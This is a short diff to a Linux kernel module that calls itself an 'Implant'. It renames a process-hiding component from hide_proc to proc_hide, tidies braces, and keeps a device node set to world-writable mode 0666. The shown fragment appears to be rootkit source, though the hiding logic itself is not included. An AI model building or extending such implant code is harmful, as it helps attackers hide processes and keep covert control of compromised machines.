@@ -6,9 +6,9 @@
 #include <linux/uaccess.h>
 #include <linux/string.h>
 
-#include "hide_proc.h"
 #include "commands.h"
 #include "log.h"
+#include "proc_hide.h"
 
 MODULE_DESCRIPTION("Implant");
 MODULE_AUTHOR("sc");
@@ -80,13 +80,11 @@ err:
 
 static char *implant_devnode(struct device *dev, umode_t *mode)
 {
-	if (!mode) {
+	if (!mode)
 		return NULL;
-	}
 
-	if (dev->devt == MKDEV(implant_major, 0)) {
+	if (dev->devt == MKDEV(implant_major, 0))
 		*mode = 0666;
-	}
 
 	return NULL;
 }
@@ -97,7 +95,7 @@ static int __init implant_init(void)
 
 	IMLOG_INFO("Loaded\n");
 
-	ret = hide_proc_init();
+	ret = proc_hide_init();
 
 	if (ret) {
 		goto err;
@@ -141,7 +139,7 @@ err:
 
 static void __exit implant_exit(void)
 {
-	hide_proc_exit();
+	proc_hide_exit();
 
 	device_destroy(implant_class, MKDEV(implant_major, 0));
 	class_destroy(implant_class);
